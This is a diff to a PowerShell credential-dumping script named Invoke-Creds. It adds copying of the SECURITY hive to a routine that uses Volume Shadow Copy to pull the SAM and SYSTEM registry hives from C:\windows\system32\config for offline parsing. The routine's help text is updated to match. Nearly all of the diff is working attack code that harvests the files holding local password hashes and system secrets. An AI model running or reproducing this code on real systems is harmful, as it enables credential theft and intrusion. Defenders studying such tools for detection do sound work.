@@ -57,8 +57,8 @@ param (
   -CopySAM [-Dest] C:\temp\
  --------------------------------------------------------------------- 
 
-   [*] Description: Utilizes Volume Shadow Copy to copy the SAM and
-       SYSTEM files from C:\windows\system32\config. These can be 
+   [*] Description: Utilizes Volume Shadow Copy to copy the SAM, SYSTEM
+       and SECURITY files from C:\windows\system32\config. These can be 
 	   parsed offline.
 
    [*] Usage: Invoke-Creds -CopySAM -Dest C:\temp\
@@ -140,6 +140,9 @@ param (
 				
 			# copy SYSTEM
 			(C:\windows\system32\cmd.exe /c copy $DeviceObjectName\windows\system32\config\SYSTEM $Dest)
+			
+			# copy SECURITY
+			(C:\windows\system32\cmd.exe /c copy $DeviceObjectName\windows\system32\config\SECURITY $Dest)
 				
 			# copy SAM
 			(C:\windows\system32\cmd.exe /c copy $DeviceObjectName\windows\system32\config\SAM $Dest)
